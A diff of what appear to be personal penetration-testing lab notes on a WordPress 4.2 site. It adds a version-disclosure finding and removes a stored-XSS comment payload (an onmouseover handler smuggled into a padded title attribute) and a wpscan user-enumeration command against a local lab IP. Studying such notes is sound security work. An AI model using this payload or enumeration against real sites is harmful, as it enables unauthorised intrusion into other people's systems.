@@ -1,20 +1,15 @@
 # 3/23
 
+Insecure Configuration Management
+
+- the readme.html file from the installation exists on the site
+- a malicious attacker could find the version installed (i.e. 4.2) then find vulnerabilities to exploit
+
+
+/*
 - XSS
 - SQLI
 - CSRF
 - User Enumeration
 - Privilege Escalation
-
---
-XSS
-
-Enter as a comment text:
-
-<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
-
---
-
-/* Enumerate users:
-
-wpscan --url http://192.168.33.10 -e u */
+*/
